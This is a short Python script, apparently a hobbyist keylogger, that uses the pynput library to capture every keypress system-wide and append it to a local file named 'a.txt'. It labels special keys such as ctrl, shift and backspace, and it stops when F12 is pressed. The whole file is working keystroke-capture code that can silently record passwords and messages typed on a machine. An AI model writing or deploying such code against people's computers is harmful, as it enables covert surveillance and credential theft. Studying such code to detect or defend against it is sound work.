from pynput.keyboard import Listener #import Listener

def write(key): #Function to write all the keys get from key board to .txt file
	key=str(key)
	if key=="Key.f12":
		raise SystemExit(0) #Exit key for program
	if (key=="Key.ctrl_l"):
		key="*ctrl*"
	if (key=="Key.shift"):
		key="*shift*"
	if (key=="Key.backspace"):
		key="*backspace*"
	if (key=="Key.space"):
		key=" "
	if (key=="Key.capslock"):
		key="*capslock*"
	if (key=="Key.enter" or key=="Key.tab" or key=="Key.alt_l"):
		key="\n"
	with open("a.txt","a") as file: #create .txt file and open file
		file.write(key.replace("'","")) #write all the keys get from keyboard to the file

with Listener(on_press=write) as listener: 
	listener.join() #command to let listener from pynput.keyboard join